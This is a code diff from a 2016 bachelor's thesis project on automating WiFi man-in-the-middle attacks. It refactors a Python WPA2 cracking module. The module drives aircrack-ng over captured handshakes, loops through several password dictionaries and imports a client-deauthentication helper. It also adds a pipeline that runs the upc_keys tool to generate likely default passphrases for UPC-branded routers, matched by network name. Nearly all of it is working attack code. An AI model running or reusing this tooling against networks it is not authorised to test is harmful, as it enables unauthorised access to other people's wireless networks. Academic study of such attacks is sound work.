@@ -2,7 +2,7 @@
 """
 WPA2 cracking
 
-Automatization of MitM Attack on WiFi Networks
+Automation of MitM Attack on WiFi Networks
 Bachelor's Thesis UIFS FIT VUT
 Martin Vondracek
 2016
@@ -24,12 +24,19 @@ Martin Vondracek
 """
 import logging
 import os
+import pipes
+import re
 import subprocess
 import tempfile
 import time
 from enum import Enum, unique
+from io import StringIO
+from typing import List, TextIO
 
-from common import WirelessCapturer, deauthenticate
+import pkg_resources
+
+from wifimitm.model import WirelessAccessPoint
+from .common import WirelessCapturer, deauthenticate
 
 __author__ = 'Martin Vondracek'
 __email__ = 'xvondr20@stud.fit.vutbr.cz'
@@ -42,6 +49,10 @@ class Wpa2Error(Exception):
 
 
 class PassphraseNotInDictionaryError(Wpa2Error):
+    pass
+
+
+class PassphraseNotInAnyDictionaryError(Wpa2Error):
     pass
 
 
@@ -70,7 +81,7 @@ class Wpa2Cracker(object):
         new = 1  # just started
         terminated = 100
 
-    def __init__(self, ap):
+    def __init__(self, ap, dictionary):
         if not ap.wpa_handshake_cap_path:
             raise ValueError
 
@@ -87,15 +98,8 @@ class Wpa2Cracker(object):
         self.process_stdout_r = None
         self.process_stderr_r = None
 
-        self.dictionary = open(os.path.join(os.getcwd(), 'dictionaries', 'dictionary0.lst'), 'r')
-        self.personalize_dictionary()
-
-    def personalize_dictionary(self):
-        """
-        Personalize dictionary by available AP details.
-        """
-        pass
-        # TODO(xvondr20) Implement personalize_dictionary
+        self.dictionary = dictionary
+        logger.debug("dictionary '{}'".format(str(self.dictionary)))
 
     def start(self):
         self.state = self.__class__.State.new
@@ -122,8 +126,8 @@ class Wpa2Cracker(object):
         # NOTE: Aircrack-ng does not flush when stdout is redirected to file and -q is set.
         self.state = self.__class__.State.ok
         logger.debug('Wpa2Cracker started; cwd=' + self.tmp_dir.name + ', ' +
-                      'stdout @ ' + self.process_stdout_w.name +
-                      ', stderr @ ' + self.process_stderr_w.name)
+                     'stdout @ ' + self.process_stdout_w.name +
+                     ', stderr @ ' + self.process_stderr_w.name)
 
     def update_state(self):
         """
@@ -131,8 +135,7 @@ class Wpa2Cracker(object):
         Read new output from stdout and stderr, check if process is alive.
         Aircrack-ng does not flush when stdout is redirected to file and -q is set. Complete stdout is available
         in the moment of termination of aircrack-ng.
-        Raises:
-            PassphraseNotInDictionaryError
+        :raises PassphraseNotInDictionaryError: If passphrase was not found in provided dictionary.
         """
         # is process running?
         if self.process.poll() is not None:
@@ -144,6 +147,7 @@ class Wpa2Cracker(object):
                 self.ap.save_psk_file(os.path.join(self.tmp_dir.name, 'psk.ascii'))
                 logger.debug('WepCracker found key!')
             if 'Passphrase not in dictionary' in line:
+                logger.info('Passphrase not in dictionary.')
                 raise PassphraseNotInDictionaryError()
 
         # check stderr
@@ -203,6 +207,25 @@ class Wpa2Cracker(object):
         self.state = None
 
 
+def get_personalized_dictionaries(target: WirelessAccessPoint) -> List[TextIO]:
+    """
+    Create and return dictionary personalized by available AP details.
+    :param target: targeted AP
+    :rtype: List[TextIO]
+    :return: list of opened personalized dictionaries
+    """
+    dictionaries = []
+    if re.match(r'^UPC\d{7}$', target.essid):
+        t = pipes.Template()
+        t.prepend('upc_keys {} {}'.format(target.essid, '24'), '.-')  # TODO(xvondr20) 5 GHz?
+        t.append('grep "  -> WPA2 phrase for "', '--')
+        t.append('sed "s/^  -> WPA2 phrase for \S* = \'\(.*\)\'$/\\1/"', '--')
+        d = t.open('dictionary-pipeline', 'r')
+        dictionaries.append(d)
+
+    return dictionaries
+
+
 class Wpa2Attacker(object):
     """
     Main class providing attack on WPA2 secured network.
@@ -218,6 +241,7 @@ class Wpa2Attacker(object):
         Start attack on WPA2 secured network.
         If targeted network have already been cracked and `force` is False, attack is skipped.
         :param force: attack even if network have already been cracked
+        :raises PassphraseNotInAnyDictionaryError: If passphrase was not in any available dictionary.
         """
         if not force and self.ap.is_cracked():
             #  AP already cracked
@@ -251,15 +275,58 @@ class Wpa2Attacker(object):
                 # TODO <-
                 capturer.stop()
                 capturer.clean()
-            cracker = Wpa2Cracker(ap=self.ap)
-            cracker.start()
 
-            while not self.ap.is_cracked():
-                cracker.update_state()
+            # prepare dictionaries
+            dictionaries = []
+            dictionaries += get_personalized_dictionaries(target=self.ap)  # personalized first
+            dictionaries.append(pkg_resources.resource_stream(__package__, 'resources/dictionary.lst'))
 
-                logger.debug('Wpa2Cracker: ' + str(cracker.state))
+            for idx, dictionary in enumerate(dictionaries):
+                try:
+                    cracker = Wpa2Cracker(ap=self.ap, dictionary=dictionary)
+                    cracker.start()
+                    while not self.ap.is_cracked():
+                        cracker.update_state()
+                        logger.debug('Wpa2Cracker: ' + str(cracker.state))
+                        time.sleep(5)
+                except PassphraseNotInDictionaryError:
+                    print('Passphrase not in dictionary. ({}/{})'.format(idx + 1, len(dictionaries)))
+                finally:
+                    cracker.stop()
+                    cracker.clean()
+                    dictionary.close()
 
-                time.sleep(5)
-            logger.info('Cracked ' + str(self.ap))
-            cracker.stop()
-            cracker.clean()
+                if self.ap.is_cracked():
+                    logger.info('Cracked ' + str(self.ap))
+                    break
+            else:
+                # Passphrase was not in any dictionary, otherwise the above loop would break.
+                logger.error('Passphrase not in any dictionary.')
+                raise PassphraseNotInAnyDictionaryError()
+
+            # AP is now cracked, close the dictionaries
+            for dictionary in dictionaries:
+                dictionary.close()
+
+
+def verify_psk(ap: WirelessAccessPoint, psk: str):
+    one_word_dictionary = StringIO(psk)
+
+    cracker = Wpa2Cracker(ap=ap, dictionary=one_word_dictionary)
+    result = False
+    try:
+        cracker.start()
+        while not ap.is_cracked():
+            cracker.update_state()
+            logger.debug('Wpa2Cracker: ' + str(cracker.state))
+            time.sleep(1)
+    except PassphraseNotInDictionaryError:
+        result = False
+    else:
+        result = True
+        logger.info('Verified ' + str(ap))
+    finally:
+        cracker.stop()
+        cracker.clean()
+        one_word_dictionary.close()
+    return result
